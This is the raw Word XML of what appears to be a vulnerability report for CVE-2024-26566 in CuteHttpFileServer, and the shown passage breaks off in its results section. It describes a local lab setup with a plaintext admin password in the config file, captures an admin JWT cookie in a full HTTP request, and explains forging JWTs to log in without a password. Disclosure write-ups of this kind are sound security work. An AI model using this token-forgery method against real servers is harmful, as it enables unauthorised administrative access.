
<file path=[Content_Types].xml><?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default ContentType="application/vnd.openxmlformats-package.relationships+xml" Extension="rels"/>
  <Default ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml" Extension="xml"/>
  <Override ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml" PartName="/docProps/app.xml"/>
  <Override ContentType="application/vnd.openxmlformats-package.core-properties+xml" PartName="/docProps/core.xml"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId7.png"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId8.png"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId9.png"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId10.png"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId11.png"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId12.png"/>
  <Override ContentType="image/png" PartName="/word/media/document_image_rId13.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ORACLE_JRE JAXB in Oracle Java 1.8.0_131 on Linux -->
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>CVE-2024-26566 JWT/Rename(English)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ub78b74e8" w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Offical website address:</w:t>
      </w:r>
      <w:hyperlink r:id="rId4">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>http://iscute.cn/chfs</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:bookmarkStart w:name="u2055fccf" w:id="1"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Offical github website address：</w:t>
      </w:r>
      <w:hyperlink r:id="rId5">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>https://github.com/ods-im/CuteHttpFileServer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkStart w:name="YQd2r" w:id="2"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment preparation </w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="2"/>
    <w:bookmarkStart w:name="mP84J" w:id="3"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>Download chfs.exe</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="3"/>
    <w:bookmarkStart w:name="u5658e51e" w:id="4"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Enter Offical website address:</w:t>
      </w:r>
      <w:hyperlink r:id="rId6">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
            <w:b w:val="false"/>
            <w:i w:val="false"/>
            <w:color w:val="0000ff"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>http://iscute.cn/chfs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Select chfs-3.1-windows</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="4"/>
    <w:bookmarkStart w:name="ua22f5013" w:id="5"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u87c18b23" w:id="6"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="3569348"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6299200" cy="3848689"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:bookmarkEnd w:id="5"/>
    <w:bookmarkStart w:name="u041ec9dc" w:id="7"/>
    <w:bookmarkEnd w:id="7"/>
    <w:bookmarkStart w:name="cRUtZ" w:id="8"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>Download the .ini file</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="8"/>
    <w:bookmarkStart w:name="u96d51539" w:id="9"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="uc2c33651" w:id="10"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="4474364"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6383866" cy="4889378"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:bookmarkEnd w:id="9"/>
    <w:bookmarkStart w:name="ZPR9A" w:id="11"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>configure .ini file</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="11"/>
    <w:bookmarkStart w:name="u89472a12" w:id="12"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.Powerusername: admin; </w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="12"/>
    <w:bookmarkStart w:name="ude7ba5f5" w:id="13"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2.The password is gdgm.edu.cn@M1n9K1n</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="13"/>
    <w:bookmarkStart w:name="uca5b61ed" w:id="14"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3.Grant the corresponding rw permissions to the admin user,then Read-only permissions for common users</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="14"/>
    <w:bookmarkStart w:name="x4cdW" w:id="15"/>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w:t>
        <w:br/>
        <w:t># 请注意：</w:t>
        <w:br/>
        <w:t>#     1，如果不存在键或对应值为空，则不影响对应的配置</w:t>
        <w:br/>
        <w:t>#     2，配置项的值，语法如同其对应的命令行参数</w:t>
        <w:br/>
        <w:t>#   //共享目录为D盘，监听端口号为8080</w:t>
        <w:br/>
        <w:t>#    chfs --path="d:/" --port=8080</w:t>
        <w:br/>
        <w:t>#  //通过配置文件进行配置，该文件可以不存在，待以后需要更改配置时使用</w:t>
        <w:br/>
        <w:t>#   chfs --file="./cfg.ini"</w:t>
        <w:br/>
        <w:t>#---------------------------------------</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t># 监听端口</w:t>
        <w:br/>
        <w:t>port=8000</w:t>
        <w:br/>
        <w:t>path=/home/ming/share_main/</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>[admin]</w:t>
        <w:br/>
        <w:t>password=gdgm.edu.cn@M1n9K1n</w:t>
        <w:br/>
        <w:t>rule.default=rw</w:t>
        <w:br/>
        <w:t>rule.r=</w:t>
        <w:br/>
        <w:t>rule.w=</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>[guest]</w:t>
        <w:br/>
        <w:t>rule.default=r</w:t>
        <w:br/>
        <w:t>rule.r=</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t># 用户操作日志存放目录，默认为空</w:t>
        <w:br/>
        <w:t># 如果赋值为空，表示禁用日志</w:t>
        <w:br/>
        <w:t>log=</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t># 下载目录策略。disable:禁用; leaf:仅限叶子目录的下载; enable或其他值:不进行限制。</w:t>
        <w:br/>
        <w:t># 默认值为 enable</w:t>
        <w:br/>
        <w:t>folder.download=</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>#-------------- 设置生效后启用HTTPS，注意监听端口设置为443-------------</w:t>
        <w:br/>
        <w:t># 指定certificate文件</w:t>
        <w:br/>
        <w:t>ssl.cert=</w:t>
        <w:br/>
        <w:t># 指定private key文件</w:t>
        <w:br/>
        <w:t>ssl.key=</w:t>
        <w:br/>
        <w:t># 设置会话的生命周期，单位：分钟，默认为30分钟</w:t>
        <w:br/>
        <w:t>session.timeout=</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="15"/>
    <w:bookmarkStart w:name="oXxus" w:id="16"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>Get the admin cookie</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="16"/>
    <w:bookmarkStart w:name="u35d9ff47" w:id="17"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Enter the passwd corresponding to admin according to the configuration file above,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>then locally login</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="17"/>
    <w:bookmarkStart w:name="ufac7c1a5" w:id="18"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ua53c55e5" w:id="19"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="2556933" cy="2042832"/>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2556933" cy="2042832"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:bookmarkEnd w:id="18"/>
    <w:bookmarkStart w:name="uba429eb4" w:id="20"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>and obtain their cookies after login successfully</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="20"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u48f9d744" w:id="21"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>GET / HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="21"/>
    <w:bookmarkStart w:name="u5075070e" w:id="22"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Host: 172.30.43.159:8000</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="22"/>
    <w:bookmarkStart w:name="u41eba4e8" w:id="23"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="23"/>
    <w:bookmarkStart w:name="u754481e5" w:id="24"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="24"/>
    <w:bookmarkStart w:name="u720e8fa9" w:id="25"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="25"/>
    <w:bookmarkStart w:name="ua795804b" w:id="26"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Accept-Encoding: gzip, deflate</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="26"/>
    <w:bookmarkStart w:name="u7203ae1e" w:id="27"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Connection: close</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="27"/>
    <w:bookmarkStart w:name="u703314f4" w:id="28"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2MiOiJhZG1pbiIsImV4cCI6MTcwOTI3NzkzMH0.YdYxdkX_VBtnsWoaMQTMK6tr63NTWh5l3rU1q27hvwY; user=admin</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="28"/>
    <w:bookmarkStart w:name="u72e47f5d" w:id="29"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Upgrade-Insecure-Requests: 1</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="29"/>
    <w:bookmarkStart w:name="QS4Xy" w:id="30"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> JWT Decryption and Forgery </w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="30"/>
    <w:bookmarkStart w:name="u96454d5e" w:id="31"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b/>
          <w:i w:val="false"/>
          <w:color w:val="df2a3f"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Note: .ini session in the configuration file is 30 minutes by default. Therefore, any JWT has to be obtained in the local environment, which cannot be provided herea</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="31"/>
    <w:bookmarkStart w:name="u07753d05" w:id="32"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>JWT decryption, the payload only contains the admin user we just registered, without verifying the current user's password. At the same time, the symmetric key has also been decrypted. From then on, any identity login can be achieved using JWT</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="32"/>
    <w:bookmarkStart w:name="uc8bae7df" w:id="33"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ud680d0e1" w:id="34"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="2447726"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="9076266" cy="3802844"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:bookmarkEnd w:id="33"/>
    <w:bookmarkStart w:name="Pp0SX" w:id="35"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve">Experimental effect </w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="35"/>
    <w:bookmarkStart w:name="u64a24648" w:id="36"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Now we are trying not to use a password, but to use our forged JWT to achieve login</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="36"/>
    <w:bookmarkStart w:name="mvlAm" w:id="37"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>before login</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="37"/>
    <w:bookmarkStart w:name="V3nl4" w:id="38"/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>first</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="38"/>
    <w:bookmarkStart w:name="ue9857a63" w:id="39"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
